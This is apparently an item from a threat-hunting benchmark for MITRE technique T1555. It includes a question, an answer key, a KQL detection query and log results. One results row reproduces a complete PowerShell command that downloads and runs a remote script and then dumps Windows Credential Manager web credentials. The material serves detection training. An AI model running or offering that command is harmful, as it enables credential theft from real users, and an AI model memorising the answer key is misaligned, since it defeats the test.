@@ -1,0 +1,36 @@
+{
+    "technique_id": "T1555",
+    "question_id": "8fd5a296-6772-4766-9991-ff4e92af7240",
+    "context": "A Windows endpoint executed a PowerShell command that downloaded and ran a remote script designed to interact with the Windows Credential Manager.",
+    "objective": "Detect the PowerShell activity that extracted web credentials and determine which function was called to perform the extraction.",
+    "technical_details": {
+        "command_analysis": "The attacker used IEX to invoke a remote PowerShell script from GitHub, then called a cmdlet to dump stored web credentials from the Credential Manager.",
+        "detection_approach": "Search process creation events for PowerShell command lines containing both a download invocation (e.g., IWR or Invoke-WebRequest) and the credential extraction function name."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Frame the question around identifying the specific function name used in the PowerShell command to extract credential manager entries.",
+    "prompt": "An endpoint shows a PowerShell process that downloaded and executed a remote script aimed at extracting credentials from the Windows Credential Manager. Review the process creation logs and identify the function name that was invoked to dump the web credentials.",
+    "answer": [
+        "Get-CredManCreds"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName endswith \"powershell.exe\"\n| where tolower(ProcessCommandLine) has_any (\"iwr\",\"invoke-webrequest\")\n| where tolower(ProcessCommandLine) contains \"get-credmancreds\"\n| extend ExtractionFunction = extract(@\"(Get-CredManCreds)\", 1, ProcessCommandLine)\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessId, ProcessCommandLine, ExtractionFunction",
+    "KQL_validation_message": "KQL query validation successful: The results provide a row with 'ExtractionFunction' set to 'Get-CredManCreds', directly matching the expected answer. Further confirmation is provided in the 'ProcessCommandLine' column showing the execution of 'Get-CredManCreds'. Therefore, the query results do contain the evidence needed.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ProcessId",
+            "ProcessCommandLine",
+            "ExtractionFunction"
+        ],
+        [
+            "2025-05-07 17:04:19.677925+00:00",
+            "windows-vm",
+            "wipro",
+            2832,
+            "\"powershell.exe\" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force}",
+            "Get-CredManCreds"
+        ]
+    ]
+}
